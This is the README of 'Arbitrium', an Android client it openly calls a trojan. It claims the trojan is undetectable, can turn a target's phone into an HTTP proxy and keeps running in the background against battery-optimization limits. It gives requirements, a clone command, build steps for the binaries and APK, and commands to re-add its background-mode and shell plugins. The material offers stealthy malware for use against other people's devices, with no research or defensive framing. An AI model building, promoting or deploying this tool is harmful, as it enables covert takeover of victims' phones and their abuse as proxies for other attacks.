[![Version](https://img.shields.io/badge/version-1.0.0-blue)]() [![License: Apache 2.0](https://img.shields.io/badge/license-Apache%202-blue)](https://opensource.org/licenses/Apache-2.0)


Arbitrium android client
======

This is the android client/trojan, it's undetectable, can turn the target phone to a HTTP proxy and runs in the background permanently without being killed because of battery optimization's restrictions 


#### Requirements

```
cordova: 7.0.1
Java JDK: 1.8.0
Android SDK: 29
Android NDK
```


#### Build

`git clone https://github.com/BenChaliah/Arbitrium-Android --recursive`

- Build the binaries:

`$ make clean && make build`


- Build APK:

`$ cd Build_APK && cordova build android`



> :warning: if you modify [Netbolt-Orange-plugin](https://github.com/BenChaliah/cordova-shell-swissknife-plugin) or [Background-mode-plugin](/APK_Plugins/cordova-plugin-background-mode) you should run the following:

```
cordova plugin add ../APK_Plugins/cordova-plugin-background-mode
cordova plugin add ../APK_Plugins/netbolt-orange-plugin
```